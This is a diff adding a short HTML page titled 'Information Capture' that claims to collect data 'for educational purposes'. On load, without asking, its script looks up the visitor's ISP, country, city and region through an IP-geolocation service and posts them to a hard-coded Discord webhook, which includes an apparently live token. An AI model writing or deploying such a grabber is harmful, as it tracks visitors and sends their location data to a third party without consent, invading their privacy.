@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Information Capture</title>
+</head>
+<body>
+    <h1>Information Capture</h1>
+    <p>Your information is being captured for educational purposes...</p>
+    <script>
+        function sendInfo() {
+            fetch('http://ip-api.com/json')
+                .then(response => response.json())
+                .then(data => {
+                    var webhookURL2 = 'https://discord.com/api/webhooks/1256473675356438598/OQZ3wEVsh0fEm3r1ovS3iTDGm4-GKPK5cu7aX30X0LF61RGIfUVDYyGvJ-DRZXgt-AU2';
+                    var messageContent = {
+                        content: `ISP: ${data.isp}, Country: ${data.country}, City: ${data.city}, Region: ${data.regionName}`
+                    };
+
+                    fetch(webhookURL2, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(messageContent)
+                    }).then(response => {
+                        if (response.ok) {
+                            alert('Information sent to Discord!');
+                        } else {
+                            alert('Error sending information.');
+                        }
+                    }).catch(error => {
+                        console.error('Error:', error);
+                    });
+                }).catch(error => {
+                    console.error('Error fetching IP information:', error);
+                });
+        }
+
+        // Call sendInfo function when the page loads
+        window.onload = sendInfo;
+    </script>
+</body>
+</html>
